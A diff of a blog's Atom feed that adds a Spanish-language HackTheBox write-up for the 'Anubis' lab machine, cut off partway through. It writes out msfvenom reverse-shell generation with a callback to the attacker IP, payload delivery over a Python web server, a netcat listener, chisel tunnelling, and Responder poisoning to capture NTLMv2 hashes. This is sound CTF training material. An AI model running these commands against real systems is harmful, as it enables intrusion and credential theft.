@@ -1,5 +1,1288 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-11T00:37:09-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Authority (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" rel="alternate" type="text/html" title="HackTheBox - Authority (medium)" /><published>2024-07-10T00:00:00-06:00</published><updated>2024-07-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-14T14:56:17-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Anubis (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html" rel="alternate" type="text/html" title="HackTheBox - Anubis (insane)" /><published>2024-07-14T00:00:00-06:00</published><updated>2024-07-14T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/3a460ae7ce41664384f83e3d6e2c7650.png" />
+</p>
+
+<ul>
+  <li>Anubis is an insane difficulty Windows machine that showcases how a writable certificate template in the Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an Active Directory environment. An interactive shell on a Windows container can be obtained by exploiting a simple ASP code injection vulnerability in a public-facing web application. Pivoting from the initial shell, further access is gained to an internal web application that can be tricked into sending requests to an attacker-controlled Responder server, allowing to steal valid domain credentials that can be used to access an internal SMB share where malicious Jamovi files can be uploaded, resulting in a shell on the Windows host. After adding the smart card logon extended usage attribute to an available certificate template and requesting a new client certificate, PKINIT can be configured on an attacking Linux machine to request a Kerberos ticket and login to the system as Administrator.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ../nmap/targeted
+<span class="c"># Nmap 7.94SVN scan initiated Fri Jul 12 17:35:12 2024 as: nmap -sCV -p135,443,445,593,49694 -oN targeted 10.10.11.102</span>
+Nmap scan report <span class="k">for </span>10.10.11.102
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_ssl-date: 2024-07-12T23:45:55+00:00<span class="p">;</span> +8m51s from scanner time.
+| tls-alpn:
+|_  http/1.1
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
+| Subject Alternative Name: DNS:www.windcorp.htb
+| Not valid before: 2021-05-24T19:44:56
+|_Not valid after:  2031-05-24T19:54:56
+|_http-title: Not Found
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49694/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8m52s, deviation: 2s, median: 8m50s
+| smb2-time:
+|   <span class="nb">date</span>: 2024-07-12T23:45:23
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>No podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code> de momento.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.102
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos el nombre del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar los nombres al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb
+</code></pre></div></div>
+
+<ul>
+  <li>No vemos nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/1.png" />
+</p>
+
+<ul>
+  <li>Si analizamos el escaneo de <strong>Nmap</strong> vemos un subdominio pero si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> vemos que también existe.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_ssl-date: 2024-07-12T23:45:55+00:00<span class="p">;</span> +8m51s from scanner time.
+| tls-alpn:
+|_  http/1.1
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
+| Subject Alternative Name: DNS:www.windcorp.htb
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.windcorp.htb"</span> <span class="nt">-u</span> https://windcorp.htb
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://windcorp.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   200        1007 L   3245 W     46774 Ch    "www"
+</span></code></pre></div></div>
+
+<ul>
+  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
+10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb www.windcorp.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si nos carga una pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/2.png" />
+</p>
+
+<ul>
+  <li>Al no haber nada interesante en la página web vamos a probar con la parte de <code class="language-plaintext highlighter-rouge">contact</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/3.png" />
+</p>
+
+<ul>
+  <li>Vemos que la extensión es <code class="language-plaintext highlighter-rouge">.asp</code> <a href="https://www.dommia.com/es/faqs/que-es-asp">https://www.dommia.com/es/faqs/que-es-asp</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/4.png" />
+</p>
+
+<ul>
+  <li>Vemos que corre un <code class="language-plaintext highlighter-rouge">IIS</code> <a href="https://blog.infranetworking.com/servidor-iis/">https://blog.infranetworking.com/servidor-iis/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb https://www.windcorp.htb/preview.asp
+https://www.windcorp.htb/preview.asp <span class="o">[</span>200 OK] ASP_NET, Bootstrap, Cookies[ASPSESSIONIDSEAQBQCA], Country[RESERVED][ZZ], Email[contact@windcorp.htb,test@test.com], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Microsoft-IIS[10.0]
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Podemos inyectar código <code class="language-plaintext highlighter-rouge">asp</code> en la parte del <code class="language-plaintext highlighter-rouge">message</code> <a href="https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html">https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">whoami</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/5.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vemos que estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
+  </li>
+  <li>
+    <p>Vamos a ganar acceso a la máquina.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom <span class="nt">-p</span> windows/x64/powershell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.74 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1887 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ejecutar un servidor <code class="language-plaintext highlighter-rouge">http</code> en <code class="language-plaintext highlighter-rouge">python3</code> para compartir el <code class="language-plaintext highlighter-rouge">.exe</code> y descargarlo en la máquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora empleando la misma <code class="language-plaintext highlighter-rouge">query</code> que usamos para ejecutar <code class="language-plaintext highlighter-rouge">whoami</code> vamos a cambiar el comando para descargar el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/6.png" />
+</p>
+
+<ul>
+  <li>Una vez nos llega la petición sabemos que se descargo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.102 - - <span class="o">[</span>14/Jul/2024 12:29:42] <span class="s2">"GET /shell.exe HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a ponernos en escucha para hacer la petición y recibir la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Al darle a <code class="language-plaintext highlighter-rouge">send</code> y a Yes nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/7.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 49862
+Windows PowerShell running as user WEBSERVER01<span class="nv">$ </span>on WEBSERVER01
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-localadmin">Shell as localadmin</h2>
+
+<ul>
+  <li>Estamos en un contenedor.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter vEthernet <span class="o">(</span>Ethernet<span class="o">)</span>:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> :
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::706d:5871:4a4e:eeae%32
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.31.91.26
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.240.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.31.80.1
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos un certificado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">cd  </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        5/24/2021   9:36 PM            989 req.txt
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>req.txt
+<span class="nt">-----BEGIN</span> CERTIFICATE REQUEST-----
+MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
+ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
+Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
+KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
+BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
+eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
+QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
+qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
+1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
+JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
+WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
+yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
+F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
+CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
+<span class="nv">4TlwpQ</span><span class="o">==</span>
+<span class="nt">-----END</span> CERTIFICATE REQUEST-----
+</code></pre></div></div>
+
+<ul>
+  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">openssl</code> podemos ver información sobre el certificado y encontramos un subdominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl req <span class="nt">-in</span> req.txt <span class="nt">-text</span> <span class="nt">-noout</span>
+Certificate Request:
+    Data:
+        Version: 1 <span class="o">(</span>0x0<span class="o">)</span>
+        Subject: <span class="nv">C</span><span class="o">=</span>AU, <span class="nv">ST</span><span class="o">=</span>Some-State, <span class="nv">O</span><span class="o">=</span>WindCorp, <span class="nv">CN</span><span class="o">=</span>softwareportal.windcorp.htb
+</code></pre></div></div>
+
+<ul>
+  <li>De primero no podremos ver el contenido por que no estamos en la máquina real entonces vamos agregar el subdominio con la <code class="language-plaintext highlighter-rouge">ip</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para después hacer <code class="language-plaintext highlighter-rouge">pivoting</code> y ver el contenido de la web.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"172.31.80.1 softwareportal.windcorp.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+172.31.80.1 softwareportal.windcorp.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora haremos un túnel con <code class="language-plaintext highlighter-rouge">chisel</code> para poder el contenido del subdominio <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">--port</span> 7777
+2024/07/14 12:52:12 server: Reverse tunnelling enabled
+2024/07/14 12:52:12 server: Fingerprint <span class="nv">hQlhzIeg9gPeaeLFyYcqON7asMg19ni17iUMIiEN7L0</span><span class="o">=</span>
+2024/07/14 12:52:12 server: Listening on http://0.0.0.0:7777
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora corremos el chisel en la máquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\c</span>hisel.exe client 10.10.14.74:7777 R:socks
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora definimos el proxy para poder ver el contenido.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/8.png" />
+</p>
+
+<ul>
+  <li>Esta es la web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/9.png" />
+</p>
+
+<ul>
+  <li>Vemos que hay un apartado donde la empresa ofrece software si ponemos el cursos en alguna de ellos vemos que en la URL pone una IP y el recurso.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/anubis/10.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Lo que podemos hacer es manipular esa petición que se hace para ver a donde viaja.</p>
+  </li>
+  <li>
+    <p>Vamos a ponernos a capturar el trafico para verlo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 <span class="nt">-w</span> Captura.cap <span class="nt">-v</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora cambiamos la IP a la nuestra y enviamos la petición pasando por el tunel.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s1">'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.74&amp;software=7z1900-x64.exe'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora analizamos la captura.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura.cap 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que hay varias conexiones al puerto <code class="language-plaintext highlighter-rouge">5985</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   70   9.313637  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50335 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
+   71   9.923557 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50335 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
+   72   9.923609  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50335 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
+   73  10.032167 10.10.11.102 → 10.10.14.74  TCP 52 50336 → 5985 <span class="o">[</span>SYN, ECE, CWR] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
+   74  10.032215  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
+   75  10.641543 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50336 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
+   76  10.641575  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
+   77  11.251435 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50336 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
+   78  11.251515  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
+</code></pre></div></div>
+
+<ul>
+  <li>Ese puerto corresponde al servicio <code class="language-plaintext highlighter-rouge">winrm</code> si se esta comunicando a ese puerto esta viajando alguna autenticación podemos usar responder para al momento de enviar otra petición capturar algún hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> del usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+  To <span class="nb">kill </span>this script hit CTRL-C
+
+
+<span class="o">[</span>+] Poisoners:
+    LLMNR                      <span class="o">[</span>ON]
+    NBT-NS                     <span class="o">[</span>ON]
+    MDNS                       <span class="o">[</span>ON]
+    DNS                        <span class="o">[</span>ON]
+    DHCP                       <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Servers:
+    HTTP server                <span class="o">[</span>ON]
+    HTTPS server               <span class="o">[</span>ON]
+    WPAD proxy                 <span class="o">[</span>OFF]
+    Auth proxy                 <span class="o">[</span>OFF]
+    SMB server                 <span class="o">[</span>ON]
+    Kerberos server            <span class="o">[</span>ON]
+    SQL server                 <span class="o">[</span>ON]
+    FTP server                 <span class="o">[</span>ON]
+    IMAP server                <span class="o">[</span>ON]
+    POP3 server                <span class="o">[</span>ON]
+    SMTP server                <span class="o">[</span>ON]
+    DNS server                 <span class="o">[</span>ON]
+    LDAP server                <span class="o">[</span>ON]
+    MQTT server                <span class="o">[</span>ON]
+    RDP server                 <span class="o">[</span>ON]
+    DCE-RPC server             <span class="o">[</span>ON]
+    WinRM server               <span class="o">[</span>ON]
+    SNMP server                <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] HTTP Options:
+    Always serving EXE         <span class="o">[</span>OFF]
+    Serving EXE                <span class="o">[</span>OFF]
+    Serving HTML               <span class="o">[</span>OFF]
+    Upstream Proxy             <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Poisoning Options:
+    Analyze Mode               <span class="o">[</span>OFF]
+    Force WPAD auth            <span class="o">[</span>OFF]
+    Force Basic Auth           <span class="o">[</span>OFF]
+    Force LM downgrade         <span class="o">[</span>OFF]
+    Force ESS downgrade        <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Generic Options:
+    Responder NIC              <span class="o">[</span>tun0]
+    Responder IP               <span class="o">[</span>10.10.14.74]
+    Responder IPv6             <span class="o">[</span>dead:beef:2::1048]
+    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
+    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-P9UIMI6NYMM]
+    Responder Domain Name      [DB1Q.LOCAL]
+    Responder DCE-RPC Port     [45735]
+
+[+] Listening for events...
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora que desplegamos el envenenador vamos a enviar la petición.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s1">'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.74&amp;software=7z1900-x64.exe'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Obtenemos un hash.</li>
+</ul>
+
+<blockquote>
+  <p>En tu caso si es la primera vez que haces la máquina el hash te debe de llegar al responder pero como yo ya lo había capturado antes responder lo ignora entonces puedo volver a verlo por que guarda los hashes en una ruta.</p>
